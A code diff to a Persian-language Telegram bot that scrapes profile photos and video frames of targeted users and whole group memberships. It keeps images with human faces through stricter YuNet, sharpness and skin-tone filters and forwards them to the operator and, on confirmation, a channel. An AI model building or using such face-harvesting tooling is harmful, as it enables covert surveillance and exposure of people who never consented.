@@ -1,10 +1,11 @@
 """
 ربات دریافت پروفایل
-- تشخیص چهره با حساسیت بالا
+- تشخیص چهره انسانی سخت‌گیرانه (وضوح + رنگ پوست + نسبت چهره)
 - پشتیبانی از چند آیدی
 - دکمه شیشه‌ای شماره
 - صفحه عددی Inline برای کد
 - فعال‌سازی خودکار اکانت و قالب
+- دکمه تایید برای ارسال به کانال
 """
 
 import asyncio
@@ -60,19 +61,21 @@ DATABASE_URL = os.environ.get("DATABASE_URL", "")
 BOT_API_ID = int(os.environ.get("BOT_API_ID", "2040"))
 BOT_API_HASH = os.environ.get("BOT_API_HASH", "b18441a1ff607e10a989891a5462e627")
 
-# ═══════════════ تنظیمات تشخیص چهره (حساسیت بالا) ═══════════════
+# ═══════════════ تنظیمات تشخیص چهره (سخت‌گیرانه) ═══════════════
 MAX_PHOTOS_TOTAL = 10
-FACE_CONFIDENCE = 0.4        # حساسیت بالا (قبلاً 0.65)
-MIN_FACE_SIZE = 20           # چهره‌های کوچیک هم قبول (قبلاً 40)
-MAX_FACES_PER_IMAGE = 10     # حداکثر چهره در یه عکس (قبلاً 3)
-MIN_FACE_RATIO = 0.3         # بازتر (قبلاً 0.5)
-MAX_FACE_RATIO = 2.5         # بازتر (قبلاً 1.8)
-MIN_SHARPNESS = 20           # حداقل وضوح (برای حذف فیک)
+FACE_CONFIDENCE = 0.7        # اعتماد بالا
+MIN_FACE_SIZE = 60           # چهره باید بزرگ باشه
+MAX_FACES_PER_IMAGE = 3      # حداکثر 3 چهره در هر عکس
+MIN_FACE_RATIO = 0.6         # نسبت ابعاد چهره انسانی
+MAX_FACE_RATIO = 1.6
+MIN_SHARPNESS = 250          # وضوح بالا (حذف نقاشی/انیمیشن)
+MIN_SKIN_RATIO = 0.35        # رنگ پوست بالا (حذف گربه/سگ)
+MIN_FACE_AREA = 0.03         # چهره حداقل 3% کل عکس باشه
 
 # ═══════════════ ویدیو ═══════════════
-VIDEO_MAX_SIZE_MB = 30
-VIDEO_FRAME_SKIP = 15        # فریم‌های بیشتر (قبلاً 30)
-VIDEO_MAX_FRAMES = 20        # حداکثر فریم از هر ویدیو
+VIDEO_MAX_SIZE_MB = 20
+VIDEO_FRAME_SKIP = 30
+VIDEO_MAX_FRAMES = 10
 
 
 # ==================== State ====================
@@ -120,11 +123,13 @@ def init_yunet():
 
 def has_human_face(img_bgr):
     """
-    تشخیص چهره انسانی با حساسیت بالا
-    - چهره‌های کوچیک قبول می‌شن
-    - چهره‌های با نور کم قبول می‌شن
-    - چهره‌های با زاویه قبول می‌شن
-    - چهره‌های فیک (تار/انیمیشن) رد می‌شن
+    تشخیص چهره انسانی واقعی با فیلترهای سخت‌گیرانه:
+    1. اعتماد بالا (score >= 0.7)
+    2. سایز بزرگ (>= 60px)
+    3. نسبت ابعاد انسانی (0.6-1.6)
+    4. وضوح بالا (sharpness >= 250)
+    5. رنگ پوست (skin ratio >= 0.35)
+    6. چهره حداقل 3% کل عکس
     """
     detector = init_yunet()
     if detector is None:
@@ -132,8 +137,8 @@ def has_human_face(img_bgr):
 
     try:
         h, w = img_bgr.shape[:2]
-        
-        # resize فقط برای سرعت تشخیص
+        img_area = h * w
+
         detect_img = img_bgr
         if w > 1000:
             scale = 1000 / w
@@ -149,51 +154,84 @@ def has_human_face(img_bgr):
         ratio_w = w / dw
         ratio_h = h / dh
 
-        valid_count = 0
-
         for face in faces[:MAX_FACES_PER_IMAGE]:
             score = face[-1]
             x, y, fw, fh = face[0:4]
 
-            # سایز واقعی در تصویر اصلی
             real_fw = fw * ratio_w
             real_fh = fh * ratio_h
 
-            # چک اعتماد
+            # 1. اعتماد
             if score < FACE_CONFIDENCE:
                 continue
 
-            # چک سایز (حساس: چهره‌های کوچیک هم قبول)
+            # 2. سایز
             if real_fw < MIN_FACE_SIZE or real_fh < MIN_FACE_SIZE:
                 continue
 
-            # چک نسبت ابعاد
+            # 3. نسبت ابعاد
             ratio = real_fw / real_fh if real_fh > 0 else 0
             if ratio < MIN_FACE_RATIO or ratio > MAX_FACE_RATIO:
                 continue
 
-            # ═══════════ چک وضوح (برای حذف چهره‌های فیک) ═══════════
+            # 4. مساحت چهره
+            face_area_ratio = (real_fw * real_fh) / img_area
+            if face_area_ratio < MIN_FACE_AREA:
+                continue
+
+            # مختصات
             x1 = max(0, int(x * ratio_w))
             y1 = max(0, int(y * ratio_h))
             x2 = min(w, int((x + fw) * ratio_w))
             y2 = min(h, int((y + fh) * ratio_h))
 
-            if x2 > x1 and y2 > y1:
-                face_crop = img_bgr[y1:y2, x1:x2]
-                if face_crop.size > 0:
-                    try:
-                        gray = cv2.cvtColor(face_crop, cv2.COLOR_BGR2GRAY)
-                        sharpness = cv2.Laplacian(gray, cv2.CV_64F).var()
-                        # اگه خیلی تار بود، رد کن
-                        if sharpness < MIN_SHARPNESS:
-                            logger.debug(f"face rejected: blurry ({sharpness:.1f})")
-                            continue
-                    except:
-                        pass
+            if x2 <= x1 or y2 <= y1:
+                continue
 
-            valid_count += 1
+            face_crop = img_bgr[y1:y2, x1:x2]
+            if face_crop.size == 0:
+                continue
 
-        return valid_count > 0
+            # 5. وضوح
+            try:
+                gray = cv2.cvtColor(face_crop, cv2.COLOR_BGR2GRAY)
+                sharpness = cv2.Laplacian(gray, cv2.CV_64F).var()
+                if sharpness < MIN_SHARPNESS:
+                    logger.debug(f"❌ blurry ({sharpness:.0f} < {MIN_SHARPNESS})")
+                    continue
+            except:
+                continue
+
+            # 6. رنگ پوست
+            try:
+                hsv = cv2.cvtColor(face_crop, cv2.COLOR_BGR2HSV)
+                ycrcb = cv2.cvtColor(face_crop, cv2.COLOR_BGR2YCrCb)
+
+                lower_hsv1 = np.array([0, 30, 80], dtype=np.uint8)
+                upper_hsv1 = np.array([25, 255, 255], dtype=np.uint8)
+                mask1 = cv2.inRange(hsv, lower_hsv1, upper_hsv1)
+
+                lower_hsv2 = np.array([160, 30, 80], dtype=np.uint8)
+                upper_hsv2 = np.array([180, 255, 255], dtype=np.uint8)
+                mask2 = cv2.inRange(hsv, lower_hsv2, upper_hsv2)
+
+                lower_ycrcb = np.array([0, 135, 85], dtype=np.uint8)
+                upper_ycrcb = np.array([255, 180, 135], dtype=np.uint8)
+                mask3 = cv2.inRange(ycrcb, lower_ycrcb, upper_ycrcb)
+
+                mask = cv2.bitwise_or(cv2.bitwise_or(mask1, mask2), mask3)
+                skin_ratio = np.sum(mask > 0) / mask.size
+
+                if skin_ratio < MIN_SKIN_RATIO:
+                    logger.debug(f"❌ no skin ({skin_ratio:.2f} < {MIN_SKIN_RATIO})")
+                    continue
+            except:
+                continue
+
+            logger.debug(f"✅ face OK (score={score:.2f}, sharp={sharpness:.0f}, skin={skin_ratio:.2f})")
+            return True
+
+        return False
 
     except Exception as e:
         logger.exception(f"has_human_face error: {e}")
@@ -463,9 +501,7 @@ async def send_photo_album(client, chat_id, photo_bytes_list, caption=None):
         return 0
 
     photo_bytes_list = photo_bytes_list[:10]
-    total = len(photo_bytes_list)
 
-    # روش ۱: send_file با لیست
     try:
         uploaded = []
         for idx, data in enumerate(photo_bytes_list):
@@ -490,7 +526,6 @@ async def send_photo_album(client, chat_id, photo_bytes_list, caption=None):
     except Exception as e:
         logger.warning(f"method 1 fail: {e}")
 
-    # روش ۲: SendMultiMedia
     try:
         uploaded = []
         for idx, data in enumerate(photo_bytes_list):
@@ -517,7 +552,6 @@ async def send_photo_album(client, chat_id, photo_bytes_list, caption=None):
     except Exception as e:
         logger.exception(f"method 2 fail: {e}")
 
-    # روش ۳: تک تک
     sent = 0
     for idx, data in enumerate(photo_bytes_list):
         try:
@@ -654,7 +688,7 @@ async def extract_photos_with_faces(client, target, status_msg=None, max_photos=
     return all_photos, total, full_name, username, user_id_str
 
 
-def extract_frames_from_video(video_path, skip=15):
+def extract_frames_from_video(video_path, skip=30):
     frames = []
     try:
         cap = cv2.VideoCapture(video_path)
@@ -723,7 +757,7 @@ async def handle_callback(event):
             if data == "code_submit":
                 current = user_temp.get(uid, {}).get('input_code', '')
                 if len(current) < 5:
-                    await event.answer(f"کد باید ۵ رقم باشه (الان {len(current)})", alert=True)
+                    await event.answer(f"کد باید ۵ رقم باشه", alert=True)
                     return
                 await submit_code(event, uid, current)
                 return
@@ -739,6 +773,7 @@ async def handle_callback(event):
                 await event.edit(f"🔐 کد تأیید\n\nکد فعلی: `{display}`", buttons=get_number_keypad_kb(current))
                 return
 
+        # ═══════ ارسال به کانال ═══════
         if data.startswith("send_channel_"):
             key = data.replace("send_channel_", "")
             payload = pending_channel_sends.get(key)
@@ -1182,7 +1217,12 @@ async def process_single_target(event, uid, target_raw):
         )
 
         if not photos:
-            await status.edit(f"❌ هیچ عکسی با چهره از {full_name} پیدا نشد.")
+            await status.edit(
+                f"❌ هیچ عکس با چهره انسانی از {full_name} پیدا نشد.\n\n"
+                f"• چهره واضح نیست\n"
+                f"• چهره کوچیکه\n"
+                f"• کیفیت پایینه"
+            )
             return
 
         footer = template_text
@@ -1205,18 +1245,32 @@ async def process_single_target(event, uid, target_raw):
             await status.edit("❌ خطا در ارسال.")
             return
 
+        # حذف پیام وضعیت
+        try:
+            await status.delete()
+        except:
+            pass
+
+        # ═══════ ذخیره برای دکمه کانال ═══════
         import uuid
         send_key = str(uuid.uuid4())[:12]
         pending_channel_sends[send_key] = {'faces': photos, 'caption': footer}
 
-        await status.edit(
+        # پاکسازی قدیمی
+        if len(pending_channel_sends) > 50:
+            keys = list(pending_channel_sends.keys())[:20]
+            for k in keys:
+                pending_channel_sends.pop(k, None)
+
+        # ═══════ پیام جدید برای پرسش کانال ═══════
+        await event.respond(
             f"✅ به پیوی ارسال شد ({sent_owner} عکس)\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"👤 {full_name}\n"
             f"🆔 `@{username or 'ندارد'}`\n"
-            f"📊 کل: {total}\n"
-            f"🖼 چهره: {len(photos)}\n\n"
-            f"به کانال بفرستم؟",
+            f"📊 کل فایل: {total}\n"
+            f"🖼 چهره انسانی: {len(photos)}\n\n"
+            f"❓ آیا به کانال ارسال شود؟",
             buttons=[
                 [btn("📡 ارسال به کانال", f"send_channel_{send_key}".encode(), "success")],
                 [btn("❌ لغو", f"cancel_channel_{send_key}".encode(), "danger")]
@@ -1292,12 +1346,6 @@ async def process_multi_targets(event, uid, targets):
 
                 await send_photo_album(bot, uid, photos, caption=footer or None)
 
-                if CHANNEL_ID:
-                    try:
-                        await send_photo_album(bot, CHANNEL_ID, photos, caption=footer or None)
-                    except:
-                        pass
-
                 success += 1
             except Exception as e:
                 logger.warning(f"multi target error: {e}")
@@ -1306,7 +1354,10 @@ async def process_multi_targets(event, uid, targets):
             await asyncio.sleep(1)
 
         await status.edit(
-            f"✅ تکمیل\nکل: {total}\nموفق: {success}\nناموفق: {failed}",
+            f"✅ تکمیل\n"
+            f"کل: {total}\n"
+            f"موفق: {success}\n"
+            f"ناموفق: {failed}",
             buttons=back_kb()
         )
 
@@ -1414,12 +1465,6 @@ async def process_group(event, uid, link):
 
                 await send_photo_album(bot, uid, photos, caption=footer or None)
 
-                if CHANNEL_ID:
-                    try:
-                        await send_photo_album(bot, CHANNEL_ID, photos, caption=footer or None)
-                    except:
-                        pass
-
                 success += 1
             except Exception as e:
                 logger.warning(f"group target error: {e}")
@@ -1427,7 +1472,10 @@ async def process_group(event, uid, link):
             await asyncio.sleep(1)
 
         await status.edit(
-            f"✅ تکمیل\nگروه: {group_title}\nتعداد: {total}\nپردازش: {success}",
+            f"✅ تکمیل\n"
+            f"گروه: {group_title}\n"
+            f"تعداد: {total}\n"
+            f"پردازش: {success}",
             buttons=back_kb()
         )
 
@@ -1448,6 +1496,8 @@ async def main():
 
     logger.info(f"مالکان: {ADMIN_IDS}")
     logger.info(f"کانال: {CHANNEL_ID}")
+    logger.info(f"تنظیمات تشخیص: confidence={FACE_CONFIDENCE}, size={MIN_FACE_SIZE}, "
+                f"sharpness={MIN_SHARPNESS}, skin={MIN_SKIN_RATIO}")
 
     max_retries = 10
     connected = False
